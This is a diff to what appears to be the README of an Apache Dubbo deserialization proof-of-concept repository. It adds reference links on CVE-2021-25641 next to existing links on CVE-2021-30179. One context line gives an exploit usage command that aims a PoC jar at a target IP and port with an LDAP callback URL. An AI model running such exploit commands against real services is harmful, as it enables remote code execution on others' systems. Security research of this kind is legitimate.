@@ -17,3 +17,5 @@ java -jar Dubbo-PoC-Spring-2.7.7.jar ip port ldap://ip:port/test
 - [CVE-2021-30179 - Dubbo Pre-auth RCE via Java deserialization in the Generic filter](https://threedr3am.github.io/2021/06/01/CVE-2021-30179%20-%20Dubbo%20Pre-auth%20RCE%20via%20Java%20deserialization%20in%20the%20Generic%20filter/)
 - https://securitylab.github.com/research/apache-dubbo/
 - https://securitylab.github.com/advisories/GHSL-2021-097-apache-dubbo/
+- [浅析Dubbo Kryo/FST反序列化漏洞（CVE-2021-25641）](https://www.mi1k7ea.com/2021/06/30/%E6%B5%85%E6%9E%90Dubbo-KryoFST%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-25641%EF%BC%89/)
+- https://checkmarx.com/blog/technical-blog/the-0xdabb-of-doom-cve-2021-25641/
